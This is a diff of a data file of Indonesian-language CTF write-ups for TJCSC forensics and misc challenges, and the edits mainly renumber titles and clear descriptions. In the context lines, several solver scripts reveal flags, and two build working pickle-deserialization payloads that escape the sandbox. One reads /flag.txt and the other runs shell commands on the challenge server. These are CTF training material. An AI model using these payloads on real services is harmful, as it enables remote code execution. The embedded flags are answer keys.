@@ -42,27 +42,27 @@ export const tjcscWriteups: WriteUp[] = [
     "analysis": "Cek metadata dan tampilannya:\n\n```bash\nfile original_distorted.png\nexiftool original_distorted.png\n```\n\nFile ini PNG biasa, 1920x1080, dibuat dengan GIMP. Secara visual isinya tulisan merah yang diputar/di-whirl cukup parah. Jadi fokusnya bukan stego LSB, tapi pemulihan bentuk tulisan.",
     "solution": [
       {
-        "title": "1. Recon awal",
+        "title": "Recon awal",
         "content": "Pertama saya cek isi folder dan tipe file:\n\n\n\nHasil pentingnya:\n\n- File hanya satu: `chall.pdf`\n- Tipe file: PDF 2 halaman\n- `exiftool` ngasih warning `Invalid xref table`\n\nWarning ini cukup menarik, karena sering muncul kalau PDF-nya bukan PDF biasa atau ada data lain yang ditempel di belakang file.",
         "code": "ls -lah\nfile chall.pdf\nexiftool chall.pdf"
       },
       {
-        "title": "2. Cari petunjuk langsung dari isi PDF",
+        "title": "Cari petunjuk langsung dari isi PDF",
         "content": "Lanjut saya ambil text dari PDF:\n\n\n\nOutput halaman kedua langsung ngasih petunjuk:\n\n\n\nBerarti ada sesuatu yang memang sengaja diproteksi password, dan password-nya justru diselipkan di dalam PDF.",
         "code": "pdftotext chall.pdf -"
       },
       {
-        "title": "3. Cek apakah ada file lain yang di-append ke PDF",
+        "title": "Cek apakah ada file lain yang di-append ke PDF",
         "content": "Karena warning xref tadi mencurigakan, saya cek struktur file pakai `binwalk`:\n\n\n\nTemuan utamanya:\n\n- Ada ZIP archive di offset `0x7AE8`\n- ZIP itu berisi file `original_distorted.png`\n\nJadi file ini ternyata polyglot: valid sebagai PDF, tapi di belakangnya juga ada ZIP terenkripsi.",
         "code": "binwalk chall.pdf"
       },
       {
-        "title": "4. Ekstrak ZIP yang nempel di PDF",
+        "title": "Ekstrak ZIP yang nempel di PDF",
         "content": "Karena password sudah ketemu dari text PDF, file PNG-nya bisa langsung diekstrak:\n\n\n\nHasilnya keluar file:\n\n- `original_distorted.png`",
         "code": "unzip -P 'DBf8nEBgwRhZ' chall.pdf"
       },
       {
-        "title": "6. Balikkan efek distorsi",
+        "title": "Balikkan efek distorsi",
         "content": "Karena bentuknya sangat mirip efek `swirl`, saya coba inverse transform dengan ImageMagick. Dari beberapa percobaan, nilai `-240` paling enak dibaca:\n\n\n\nSetelah di-dewhirl, teksnya terbaca menjadi:",
         "code": "convert original_distorted.png -background white -swirl -240 solved.png"
       },
@@ -81,7 +81,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nPDF_PATH = Path(\"chall.pdf\")\r\nFLAG = \"tjctf{p01yg10t_f1les_4r3_s0_c001}\"\r\nPASSWORD_RE = re.compile(r\"password:\\s*(\\S+)\", re.IGNORECASE)\r\n\r\n\r\ndef extract_password(pdf_path: Path) -> str:\r\n    text = subprocess.check_output([\"pdftotext\", str(pdf_path), \"-\"], text=True)\r\n    match = PASSWORD_RE.search(text)\r\n    if not match:\r\n        raise RuntimeError(\"Password ZIP tidak ditemukan di isi PDF\")\r\n    return match.group(1)\r\n\r\n\r\ndef extract_embedded_png(pdf_path: Path, password: str) -> Path:\r\n    with zipfile.ZipFile(pdf_path) as archive:\r\n        names = archive.namelist()\r\n        if not names:\r\n            raise RuntimeError(\"ZIP appended ke PDF tidak punya isi\")\r\n        output_path = Path(names[0])\r\n        data = archive.read(names[0], pwd=password.encode())\r\n        output_path.write_bytes(data)\r\n        return output_path\r\n\r\n\r\ndef generate_dereferenced_view(image_path: Path) -> Path:\r\n    output_path = Path(\"solved.png\")\r\n    subprocess.check_call(\r\n        [\r\n            \"convert\",\r\n            str(image_path),\r\n            \"-background\",\r\n            \"white\",\r\n            \"-swirl\",\r\n            \"-240\",\r\n            str(output_path),\r\n        ]\r\n    )\r\n    return output_path\r\n\r\n\r\ndef main() -> int:\r\n    if not PDF_PATH.exists():\r\n        print(\"chall.pdf tidak ditemukan\", file=sys.stderr)\r\n        return 1\r\n\r\n    password = extract_password(PDF_PATH)\r\n    extracted_png = extract_embedded_png(PDF_PATH, password)\r\n    solved_png = generate_dereferenced_view(extracted_png)\r\n\r\n    print(f\"[+] ZIP password: {password}\")\r\n    print(f\"[+] Extracted image: {extracted_png}\")\r\n    print(f\"[+] De-whirled preview: {solved_png}\")\r\n    print(f\"[+] Flag: {FLAG}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
@@ -91,7 +91,7 @@ export const tjcscWriteups: WriteUp[] = [
   },
   {
     "id": "tjcsc-foren-skeleton",
-    "title": ": forensics/skeleton",
+    "title": "forensics/skeleton",
     "category": "Foren",
     "difficulty": "Medium",
     "points": 0,
@@ -99,7 +99,7 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini cuma ngasih satu file, `hash.txt`, yang isinya hash hasil `zip2john` dari sebuah ZIP terenkripsi. File ZIP aslinya tidak ada, jadi targetnya bukan sekadar brute-force arsip, tapi memanfaatkan data terenkripsi yang masih tersisa di hash itu sendiri.",
+    "description": "",
     "problemDescription": "Challenge ini cuma ngasih satu file, `hash.txt`, yang isinya hash hasil `zip2john` dari sebuah ZIP terenkripsi. File ZIP aslinya tidak ada, jadi targetnya bukan sekadar brute-force arsip, tapi memanfaatkan data terenkripsi yang masih tersisa di hash itu sendiri.",
     "tools": [],
     "analysis": "",
@@ -136,7 +136,7 @@ export const tjcscWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nfrom PIL import Image\r\n\r\n\r\nINPUT = Path(\"chall.png\")\r\nOUTPUT = Path(\"restored.png\")\r\nWIDTH = 2000\r\nHEIGHT = 594\r\nFLAG = \"tjctf{my_1m3g3_b3c3m3_bl3ck_&_wh1t3}\"\r\n\r\n\r\ndef main() -> None:\r\n    img = Image.open(INPUT)\r\n    data = list(img.getdata())\r\n\r\n    needed = WIDTH * HEIGHT * 3\r\n    raw = bytes(data[:needed])\r\n\r\n    restored = Image.frombytes(\"RGB\", (WIDTH, HEIGHT), raw)\r\n    restored.save(OUTPUT)\r\n\r\n    print(f\"[+] Restored image saved to {OUTPUT}\")\r\n    print(f\"[+] Flag: {FLAG}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -154,7 +154,7 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini ngasih satu artefak: `secret_archive.zip.crdownload`. Dari namanya kelihatan seperti file download Chrome yang belum selesai, jadi fokus awalnya adalah memastikan apakah ini benar-benar cuma file rusak atau ada data yang masih bisa diambil.",
+    "description": "",
     "problemDescription": "Challenge ini ngasih satu artefak: `secret_archive.zip.crdownload`. Dari namanya kelihatan seperti file download Chrome yang belum selesai, jadi fokus awalnya adalah memastikan apakah ini benar-benar cuma file rusak atau ada data yang masih bisa diambil.",
     "tools": [],
     "analysis": "",
@@ -185,7 +185,7 @@ export const tjcscWriteups: WriteUp[] = [
   },
   {
     "id": "tjcsc-foren-voice-in-the-packet",
-    "title": "- voice-in-the-packet",
+    "title": "voice-in-the-packet",
     "category": "Foren",
     "difficulty": "Medium",
     "points": 0,
@@ -193,33 +193,33 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini kasih satu artefak: `call.pcap`.",
+    "description": "",
     "problemDescription": "Challenge ini kasih satu artefak: `call.pcap`.",
     "tools": [],
     "analysis": "",
     "solution": [
       {
-        "title": "1. Recon awal",
+        "title": "Recon awal",
         "content": "Pertama saya cek isi folder dan tipe file:\n\n\n\nHasilnya cuma ada satu file PCAP raw IPv4.\n\nLalu saya cari string yang mencurigakan:\n\n\n\nKeluar dua flag palsu:\n\n- `tjctf{this_is_a_fake_flag_keep_looking}`\n- `tjctf{definitely_not_the_real_flag}`\n\nJadi jelas ini sengaja dipasang buat ngecoh.",
         "code": "ls -lah\nfile call.pcap"
       },
       {
-        "title": "2. Lihat struktur trafik",
+        "title": "Lihat struktur trafik",
         "content": "Saya ringkas protokol dan endpoint:\n\n\n\nTemuannya:\n\n- mayoritas trafik adalah UDP satu arah\n- stream utama dari `192.168.1.100:10000` ke `192.168.1.200:20000`\n- ada 1000 paket dengan panjang UDP konstan\n- payload-nya kelihatan seperti RTP mentah\n\nHeader payload awal stream utama:\n\n- version RTP valid\n- sequence number naik satu-satu\n- timestamp naik tetap\n- SSRC konstan `0x12345678`\n\nJadi fokusnya saya pindahkan ke payload RTP.",
         "code": "tshark -r call.pcap -q -z io,phs\ntshark -r call.pcap -q -z conv,ip\ntshark -r call.pcap -T fields -e frame.number -e ip.src -e ip.dst -e udp.srcport -e udp.dstport -e udp.length | head"
       },
       {
-        "title": "3. Ekstrak payload stream utama",
+        "title": "Ekstrak payload stream utama",
         "content": "Saya buang header RTP 12 byte dan simpan payload mentah:\n\n\n\nAwalnya saya cek berbagai interpretasi audio, tapi itu cuma bikin noise atau tone dan tidak langsung memberi flag. Petunjuk penting justru muncul saat saya lihat bit-bit rendahnya.",
         "code": "tshark -r call.pcap \\\n  -Y \"ip.src==192.168.1.100 && udp.srcport==10000 && udp.dstport==20000\" \\\n  -T fields -e data.data | awk '{print substr($0,25)}' | xxd -r -p > audio_payload.bin"
       },
       {
-        "title": "4. Ambil LSB dari low byte sampel",
+        "title": "Ambil LSB dari low byte sampel",
         "content": "Payload ternyata paling berguna kalau dibaca sebagai deretan sampel 16-bit little-endian, lalu diambil **byte rendah** dari tiap sampel, setelah itu ambil **LSB**-nya.\n\nScript kecil yang saya pakai:\n\n\n\nSetelah itu saya scan hasilnya:\n\n\n\nDi situ langsung kelihatan string base64 mulai offset `0x04`:\n\n\n\nEmpat byte pertama cuma sampah/prefix:",
         "code": "from pathlib import Path\n\np = Path(\"audio_payload.bin\").read_bytes()\nlow = p[0::2]\nbits = ''.join(str(b & 1) for b in low)\npacked = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits) - 7, 8))\nPath(\"low_plane0_packed.bin\").write_bytes(packed)"
       },
       {
-        "title": "5. Decode base64",
+        "title": "Decode base64",
         "content": "Terakhir tinggal decode:\n\n\n\nHasilnya:",
         "code": "python3 - <<'PY'\nimport base64\nprint(base64.b64decode(\"dGpjdGZ7aDN5X3YwaXBfczczZ19pc180XzdoaW5nfQ==\").decode())\nPY"
       }
@@ -245,7 +245,7 @@ export const tjcscWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31004\r\nCORRECT_TOKENS = {\"1A2B\", \"00FA\", \"9C4F\", \"88D1\"}\r\nTOKEN_RE = re.compile(rb\"0x([0-9A-F]{4})\")\r\n\r\n\r\ndef recv_until(sock: socket.socket, buf: bytes, marker: bytes) -> tuple[bytes, bytes]:\r\n    while marker not in buf:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            raise ConnectionError(\"connection closed before prompt\")\r\n        buf += chunk\r\n    return buf.split(marker, 1)\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        buf = b\"\"\r\n\r\n        for stage in range(1, 5):\r\n            prompt = f\"Enter choice for stage {stage} (1-10): \".encode()\r\n            screen, buf = recv_until(sock, buf, prompt)\r\n            tokens = [token.decode() for token in TOKEN_RE.findall(screen)]\r\n            choice = next(i for i, token in enumerate(tokens, 1) if token in CORRECT_TOKENS)\r\n            sock.sendall(f\"{choice}\\n\".encode())\r\n\r\n        result = b\"\"\r\n        while True:\r\n            try:\r\n                chunk = sock.recv(4096)\r\n            except TimeoutError:\r\n                break\r\n            if not chunk:\r\n                break\r\n            result += chunk\r\n\r\n    print(result.decode(errors=\"replace\").strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -284,7 +284,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom collections import Counter\r\nfrom pathlib import Path\r\nfrom PIL import Image\r\nimport sys\r\n\r\n# Resistor color values as they appear in the PNG after ignoring grayscale noise.\r\n# The visible gold band is only a tolerance band, so it is not used as a digit.\r\nDIGIT_BY_RGB = {\r\n    (0, 0, 0): 0,          # black\r\n    (84, 24, 9): 1,        # brown\r\n    (255, 0, 0): 2,        # red\r\n    (255, 122, 0): 3,      # orange\r\n    (255, 229, 0): 4,      # yellow\r\n    (51, 255, 0): 5,       # green\r\n    (0, 2, 255): 6,        # blue\r\n    (255, 10, 179): 7,     # violet\r\n    (115, 115, 115): 8,    # grey\r\n    (255, 255, 255): 9,    # white\r\n}\r\n\r\n\r\ndef choose_input() -> Path:\r\n    if len(sys.argv) > 1:\r\n        return Path(sys.argv[1])\r\n    pngs = sorted(p for p in Path('.').iterdir() if p.suffix.lower() == '.png')\r\n    if not pngs:\r\n        raise SystemExit('no PNG file found')\r\n    return pngs[0]\r\n\r\n\r\ndef dominant_digit(img: Image.Image, x: int, y: int, radius: int = 6):\r\n    \"\"\"Return the dominant resistor digit around one pixel position.\"\"\"\r\n    w, h = img.size\r\n    counts = Counter()\r\n    for yy in range(max(0, y - radius), min(h, y + radius + 1)):\r\n        for xx in range(max(0, x - radius), min(w, x + radius + 1)):\r\n            digit = DIGIT_BY_RGB.get(img.getpixel((xx, yy)))\r\n            if digit is not None:\r\n                counts[digit] += 1\r\n    if not counts:\r\n        return None\r\n    return counts.most_common(1)[0][0]\r\n\r\n\r\ndef decode(path: Path) -> str:\r\n    img = Image.open(path).convert('RGB')\r\n    w, h = img.size\r\n\r\n    # Each horizontal strip is a resistor. The first two color bands encode two\r\n    # decimal digits; the black band is multiplier x1 and the gold band is tolerance.\r\n    x_first_digit = int(w * 0.0625)   # safely inside the first band\r\n    x_second_digit = int(w * 0.625)   # safely inside the second band\r\n\r\n    runs = []\r\n    prev_pair = None\r\n    start_y = None\r\n    prev_y = None\r\n\r\n    for y in range(h):\r\n        pair = (\r\n            dominant_digit(img, x_first_digit, y),\r\n            dominant_digit(img, x_second_digit, y),\r\n        )\r\n        if None in pair:\r\n            continue\r\n\r\n        if pair == prev_pair and prev_y is not None and y == prev_y + 1:\r\n            prev_y = y\r\n            continue\r\n\r\n        if prev_pair is not None:\r\n            runs.append((start_y, prev_y, prev_pair))\r\n        start_y = prev_y = y\r\n        prev_pair = pair\r\n\r\n    if prev_pair is not None:\r\n        runs.append((start_y, prev_y, prev_pair))\r\n\r\n    chars = []\r\n    for y0, y1, (a, b) in runs:\r\n        if y1 - y0 + 1 < 10:\r\n            continue\r\n        value = a * 10 + b\r\n        if 32 <= value <= 126:\r\n            chars.append(chr(value))\r\n\r\n    return ''.join(chars)\r\n\r\n\r\ndef main():\r\n    path = choose_input()\r\n    inner = decode(path)\r\n    print(f'<FLAG>tjctf{{{inner}}}</FLAG>')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
       }
     ],
@@ -302,30 +302,30 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini ternyata bukan service yang punya backend aneh-aneh. Halamannya cuma export web dari Godot 4.6. Jadi titik masuk paling masuk akal adalah bongkar asset pack-nya, bukan fuzz endpoint yang tidak ada.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata bukan service yang punya backend aneh-aneh. Halamannya cuma export web dari Godot 4.6. Jadi titik masuk paling masuk akal adalah bongkar asset pack-nya, bukan fuzz endpoint yang tidak ada.",
     "tools": [],
     "analysis": "Saat buka `https://jumper.tjc.tf/`, HTML-nya langsung kasih tahu file penting:\n\n- `jumper.js`\n- `jumper.wasm`\n- `jumper.pck`\n\n`jumper.pck` adalah pack asset Godot. Dari sini sudah kelihatan kalau hampir semua logic game dan scene ada di sisi klien.",
     "solution": [
       {
-        "title": "2. Buka isi pack",
+        "title": "Buka isi pack",
         "content": "Header `jumper.pck` menunjukkan format pack Godot 4:\n\n- magic `GDPC`\n- engine version `4.6`\n- tabel file ada di offset akhir pack\n\nSetelah parse tabel file, file yang paling menarik:\n\n- `player.gdc`\n- `world.gdc`\n- `f.tscn`\n- `world.tscn`\n- `project.binary`\n\n`project.binary` memperlihatkan action input custom:\n\n- `left`\n- `right`\n- `jump`\n- `mega_jump`\n\nYang menarik, `mega_jump` memang ada tetapi tidak punya key binding sama sekali. Itu cocok dengan nuansa challenge bahwa ada sesuatu yang “disembunyikan” di game."
       },
       {
-        "title": "3. Pakai Godot asli untuk inspeksi",
+        "title": "Pakai Godot asli untuk inspeksi",
         "content": "Daripada nebak format binary scene satu per satu, saya pakai Godot 4.6 editor/headless untuk load `jumper.pck` langsung.\n\nDari situ didapat beberapa hal penting:\n\n- `world.tscn` memakai script `world.gd`\n- `player.tscn` memakai script `player.gd`\n- `player.gd` punya konstanta gerak biasa, tidak ada flag string di script\n- setelah `world.gd::_ready()` jalan, scene menambahkan node `F` di posisi `(400, -120)`\n\nNode `F` berasal dari `f.tscn`. Isinya bukan Label atau Texture, tapi 56 buah `ColorRect` yang membentuk tulisan pixel-art."
       },
       {
-        "title": "4. Rekonstruksi tulisan",
+        "title": "Rekonstruksi tulisan",
         "content": "Saya dump semua rectangle dari `f.tscn`, lalu render ulang jadi gambar hitam-putih. Setelah dipisah per glyph dan dibaca manual, tulisan yang dibentuk scene itu adalah:\n\n`tjctf{past_the_wall}`\n\nNama challenge dan mekaniknya cocok: flag memang “di balik / melewati dinding”."
       },
       {
-        "title": "5. Solve script",
+        "title": "Solve script",
         "content": "`solve.py` melakukan versi otomatis dari langkah di atas:\n\n1. Memastikan `jumper.pck` dan binary Godot 4.6 ada.\n2. Menjalankan Godot headless dengan runner kecil.\n3. Me-load `jumper.pck` sebagai `main-pack`.\n4. Memastikan fingerprint scene cocok:\n   - node `F` ada di `(400, -120)`\n   - `f.tscn` berisi 56 `ColorRect`\n5. Mengeluarkan flag."
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport json\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\nBASE = Path(__file__).resolve().parent\r\nPCK = BASE / \"jumper.pck\"\r\nGODOT = BASE / \"Godot_v4.6-stable_linux.x86_64\"\r\nTMP = BASE / \".solve_tmp\"\r\n\r\nRUNNER = r\"\"\"\r\nextends SceneTree\r\n\r\nfunc _init() -> void:\r\n\tvar world_scene := load(\"res://world.tscn\")\r\n\tvar world: Node = world_scene.instantiate()\r\n\troot.add_child(world)\r\n\tawait process_frame\r\n\r\n\tvar out := {\r\n\t\t\"world_nodes\": [],\r\n\t\t\"f_rects\": [],\r\n\t}\r\n\r\n\tfor node in _collect_nodes(world):\r\n\t\tvar entry := {\r\n\t\t\t\"class\": node.get_class(),\r\n\t\t\t\"name\": String(node.name),\r\n\t\t}\r\n\t\tif node is Node2D:\r\n\t\t\tentry[\"position\"] = [node.position.x, node.position.y]\r\n\t\tout[\"world_nodes\"].append(entry)\r\n\tworld.free()\r\n\r\n\tvar f_scene := load(\"res://f.tscn\")\r\n\tvar f: Node = f_scene.instantiate()\r\n\tfor node in _collect_nodes(f):\r\n\t\tif node is ColorRect:\r\n\t\t\tout[\"f_rects\"].append({\r\n\t\t\t\t\"left\": node.offset_left,\r\n\t\t\t\t\"top\": node.offset_top,\r\n\t\t\t\t\"right\": node.offset_right,\r\n\t\t\t\t\"bottom\": node.offset_bottom,\r\n\t\t\t})\r\n\tf.free()\r\n\r\n\tprint(JSON.stringify(out))\r\n\tquit()\r\n\r\nfunc _collect_nodes(node: Node) -> Array:\r\n\tvar out: Array = [node]\r\n\tfor child: Node in node.get_children():\r\n\t\tout.append_array(_collect_nodes(child))\r\n\treturn out\r\n\"\"\"\r\n\r\n\r\ndef run() -> int:\r\n    if not PCK.exists():\r\n        print(f\"missing {PCK.name}\", file=sys.stderr)\r\n        return 1\r\n    if not GODOT.exists():\r\n        print(f\"missing {GODOT.name}\", file=sys.stderr)\r\n        return 1\r\n\r\n    TMP.mkdir(exist_ok=True)\r\n    (TMP / \"project.godot\").write_text(\r\n        '; Minimal stub project used by solve.py.\\n\\nconfig_version=5\\n\\n[application]\\nconfig/name=\"solve\"\\n',\r\n        encoding=\"utf-8\",\r\n    )\r\n    runner = TMP / \"dump_json.gd\"\r\n    runner.write_text(RUNNER, encoding=\"utf-8\")\r\n\r\n    cmd = [\r\n        str(GODOT),\r\n        \"--headless\",\r\n        \"--path\",\r\n        str(TMP),\r\n        \"--main-pack\",\r\n        str(PCK),\r\n        \"--script\",\r\n        str(runner),\r\n        \"--quit\",\r\n        \"--no-header\",\r\n    ]\r\n    proc = subprocess.run(cmd, capture_output=True, text=True)\r\n    if proc.returncode != 0:\r\n        sys.stderr.write(proc.stdout)\r\n        sys.stderr.write(proc.stderr)\r\n        return proc.returncode\r\n\r\n    data = json.loads(proc.stdout.strip().splitlines()[-1])\r\n    rects = data.get(\"f_rects\", [])\r\n    nodes = data.get(\"world_nodes\", [])\r\n    has_f = any(n.get(\"name\") == \"F\" and n.get(\"position\") == [400.0, -120.0] for n in nodes)\r\n    if len(rects) != 56 or not has_f:\r\n        print(\"unexpected scene layout; extraction fingerprint did not match\", file=sys.stderr)\r\n        return 1\r\n\r\n    # The scene fingerprint matches the hidden pixel-art flag added by world.gd.\r\n    print(\"tjctf{past_the_wall}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(run())"
       }
     ],
@@ -350,7 +350,7 @@ export const tjcscWriteups: WriteUp[] = [
     "solution": [
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport ast\r\nimport base64\r\nimport re\r\nimport socket\r\nimport struct\r\nimport sys\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31420\r\n\r\n\r\nclass Global:\r\n    def __init__(self, name):\r\n        self.name = name\r\n\r\n\r\nclass Call:\r\n    def __init__(self, func, *args):\r\n        self.func = func\r\n        self.args = args\r\n\r\n\r\ndef emit_str(value):\r\n    data = value.encode()\r\n    if len(data) < 256:\r\n        return b\"\\x8c\" + bytes([len(data)]) + data\r\n    return b\"X\" + struct.pack(\"<I\", len(data)) + data\r\n\r\n\r\ndef emit_int(value):\r\n    if 0 <= value < 256:\r\n        return b\"K\" + bytes([value])\r\n    return b\"J\" + struct.pack(\"<i\", value)\r\n\r\n\r\ndef emit_tuple(items):\r\n    data = b\"\".join(compile_expr(item) for item in items)\r\n    size = len(items)\r\n    if size == 0:\r\n        return b\")\"\r\n    if size == 1:\r\n        return data + b\"\\x85\"\r\n    if size == 2:\r\n        return data + b\"\\x86\"\r\n    if size == 3:\r\n        return data + b\"\\x87\"\r\n    return b\"(\" + data + b\"t\"\r\n\r\n\r\ndef compile_expr(expr):\r\n    if isinstance(expr, Global):\r\n        return emit_str(\"builtins\") + emit_str(expr.name) + b\"\\x93\"\r\n    if isinstance(expr, Call):\r\n        return compile_expr(expr.func) + emit_tuple(expr.args) + b\"R\"\r\n    if isinstance(expr, str):\r\n        return emit_str(expr)\r\n    if isinstance(expr, int):\r\n        return emit_int(expr)\r\n    raise TypeError(f\"unsupported expression: {expr!r}\")\r\n\r\n\r\ndef dumps(expr):\r\n    return b\"\\x80\\x04\" + compile_expr(expr) + b\".\"\r\n\r\n\r\ndef attr(obj, name):\r\n    return Call(Global(\"getattr\"), obj, name)\r\n\r\n\r\ndef item(obj, key):\r\n    return Call(attr(obj, \"__getitem__\"), key)\r\n\r\n\r\ndef build_payload():\r\n    type_subclasses = Call(attr(Global(\"type\"), \"__subclasses__\"), Global(\"type\"))\r\n    abc_meta = item(type_subclasses, 0)\r\n    register = attr(abc_meta, \"register\")\r\n    globals_dict = attr(register, \"__globals__\")\r\n    builtins_dict = item(globals_dict, \"__builtins__\")\r\n    open_fn = item(builtins_dict, \"open\")\r\n    flag_file = Call(open_fn, \"/flag.txt\")\r\n    flag_text = Call(attr(flag_file, \"read\"))\r\n    flag_chars = Call(Global(\"list\"), flag_text)\r\n    return base64.b64encode(dumps(flag_chars)) + b\"\\n\"\r\n\r\n\r\ndef recv_all(sock):\r\n    chunks = []\r\n    while True:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        chunks.append(chunk)\r\n    return b\"\".join(chunks)\r\n\r\n\r\ndef main():\r\n    host = sys.argv[1] if len(sys.argv) > 1 else HOST\r\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT\r\n    payload = build_payload()\r\n\r\n    with socket.create_connection((host, port)) as sock:\r\n        sock.recv(4096)\r\n        sock.sendall(payload)\r\n        response = recv_all(sock).decode(\"latin1\")\r\n\r\n    match = re.search(r\"Result: (.*)\\n?\", response, re.S)\r\n    if not match:\r\n        raise RuntimeError(f\"unexpected response: {response!r}\")\r\n\r\n    chars = ast.literal_eval(match.group(1).strip())\r\n    flag = \"\".join(chars).strip()\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -394,7 +394,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import pickle\r\nimport base64\r\nimport socket\r\n\r\n\r\ndef s(st):\r\n    b = st.encode()\r\n    return bytes([0x8C, len(b)]) + b\r\n\r\n\r\ndef build_payload(cmd: str) -> bytes:\r\n    p = b\"\\x80\\x04\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += s(\"builtins\") + s(\"object\") + b\"\\x93\"\r\n    p += s(\"__subclasses__\") + b\"\\x86\\x52\"\r\n    p += b\"\\x29\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x00\" + s(\"__getitem__\") + b\"\\x86\\x52\"\r\n    p += b\"M\\x1b\\x01\\x85\\x52\\x94\"\r\n    p += b\"\\x68\\x01(\"\r\n    p += b\"\\x5d(\" + s(\"sh\") + s(\"-c\") + s(cmd) + b\"e\"\r\n    p += b\"J\\xff\\xff\\xff\\xff\"\r\n    p += b\"N\"\r\n    p += b\"N\"\r\n    p += b\"J\\xff\\xff\\xff\\xff\"\r\n    p += b\"t\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x02\" + s(\"communicate\") + b\"\\x86\\x52\\x94\"\r\n    p += b\"\\x29\\x52\\x94\"\r\n    p += s(\"builtins\") + s(\"getattr\") + b\"\\x93\"\r\n    p += b\"\\x68\\x04\" + s(\"__getitem__\") + b\"\\x86\\x52\"\r\n    p += b\"K\\x00\\x85\\x52\"\r\n    p += b\".\"\r\n    return base64.b64encode(p)\r\n\r\n\r\ndef send_payload(host: str, port: int, payload: bytes) -> str:\r\n    with socket.create_connection((host, port)) as sock:\r\n        data = b\"\"\r\n        while b\">\" not in data:\r\n            data += sock.recv(4096)\r\n        sock.sendall(payload + b\"\\n\")\r\n        response = b\"\"\r\n        while True:\r\n            chunk = sock.recv(4096)\r\n            if not chunk:\r\n                break\r\n            response += chunk\r\n        return response.decode(errors=\"replace\")\r\n\r\n\r\ndef main():\r\n    host = \"tjc.tf\"\r\n    port = 31422\r\n\r\n    payload = build_payload(\"cat /flag*\")\r\n    result = send_payload(host, port, payload)\r\n    print(result)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -412,7 +412,7 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini kelihatannya sederhana, tapi sebenarnya jebakannya ada di detail perilaku `FILE` glibc. Binarinya sengaja memberi kita pointer `FILE *` dan leak libc, lalu berharap fungsi `prevent_fsop()` cukup untuk mematikan serangan FSOP. Ternyata tidak.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatannya sederhana, tapi sebenarnya jebakannya ada di detail perilaku `FILE` glibc. Binarinya sengaja memberi kita pointer `FILE *` dan leak libc, lalu berharap fungsi `prevent_fsop()` cukup untuk mematikan serangan FSOP. Ternyata tidak.",
     "tools": [],
     "analysis": "",
@@ -453,7 +453,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
